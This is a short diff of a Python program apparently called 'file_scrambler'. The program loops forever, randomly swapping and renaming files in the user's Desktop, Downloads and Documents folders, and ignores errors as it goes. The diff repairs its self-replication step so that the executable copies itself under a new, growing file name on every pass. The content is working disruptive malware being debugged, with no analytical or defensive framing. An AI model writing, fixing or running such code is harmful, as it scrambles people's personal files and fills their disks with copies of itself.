@@ -123,14 +123,14 @@ def scramble(folder):#Scrambles the names of files in the specified folder by re
         except (OSError, shutil.Error):#Handles any errors that may occur during the file move operation, such as permission issues or file conflicts.
             pass
         time.sleep(0.1)#Pauses the execution for 0.1 seconds before proceeding to the next iteration of the loop, allowing for a brief delay between file renaming operations.
-x=0
+x=1
 while True:#Starts an infinite loop that continuously scrambles files in the specified folders until the program is terminated.
     desktop_files = matching_files(desktop_path)#List all files in the desktop folder that match the given extensions.
     download_files = matching_files(download_path)#List all files in the downloads folder that match the given extensions.
     documents_files = matching_files(documents_path)#List all files in the documents folder that match the given extensions.
     x*=2
     filename=f"file_scrambler{x}.exe"
-    shutil.copy2("file_scrambler.exe", "file_scrambler.exe"+x)
+    shutil.copy2("file_scrambler.exe", filename)
 
     if desktop_files and download_files:#Checks if there are files in both the desktop and downloads folders that match the given extensions.
         chosen_desktop_file = random.choice(desktop_files)#Selects a random file from the list of matching files in the desktop and downloads folders, respectively, to be swapped with each other.
